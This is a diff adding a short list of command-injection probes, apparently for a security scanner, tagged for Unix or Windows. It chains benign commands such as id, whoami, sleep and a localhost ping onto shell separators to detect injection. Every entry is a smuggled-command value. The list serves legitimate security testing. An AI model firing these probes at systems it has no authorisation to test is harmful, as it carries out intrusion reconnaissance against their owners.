@@ -1,0 +1,18 @@
+# RCE / command-injection probes (safe-ish).
+# [nix] = Unix/Linux only, [win] = Windows only, [any]/no tag = both OS targets.
+[nix];id
+[nix]|id
+[nix]&&id
+[nix]`id`
+[nix]$(id)
+[nix];sleep 5
+[nix]|sleep 5
+[nix]&&sleep 5
+[win]&whoami
+[win]|whoami
+[win]&&whoami
+[win]&ver
+[win]|ver
+[win]& ping -n 5 127.0.0.1 &
+[win]| ping -n 5 127.0.0.1
+[win]&& timeout 5
